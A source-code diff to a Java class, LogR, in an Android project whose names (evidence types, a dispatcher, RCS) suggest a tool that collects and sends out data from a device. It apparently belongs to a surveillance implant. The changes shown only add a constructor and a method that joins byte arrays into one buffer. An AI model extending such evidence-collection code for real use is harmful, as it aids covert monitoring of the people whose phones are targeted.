@@ -8,7 +8,10 @@
  * *******************************************/
 package com.ht.RCSAndroidGUI;
 
+import java.util.ArrayList;
+
 import com.ht.RCSAndroidGUI.evidence.EvidenceType;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
 import com.ht.RCSAndroidGUI.util.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -128,6 +131,10 @@ public class LogR {
 		this(evidenceType, LOG_PRI_STD, additional, data);
 	}
 
+	public LogR(EvidenceType evidence) {
+		this(evidence, LOG_PRI_STD);
+	}
+
 	// Send data to dispatcher
 	/**
 	 * Send.
@@ -163,6 +170,23 @@ public class LogR {
 		return;
 	}
 
+
+	public void write(ArrayList<byte[]> bytelist) {
+        int totalLen = 0;
+        for (byte[] token : bytelist) {
+			totalLen+=token.length;
+		}
+
+        final int offset = 0;
+        final byte[] buffer = new byte[totalLen];
+        final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen);
+
+        for (byte[] token : bytelist) {
+        	 databuffer.write(token);
+		}
+        
+		write(buffer);
+	}
 
 	/**
 	 * Close.
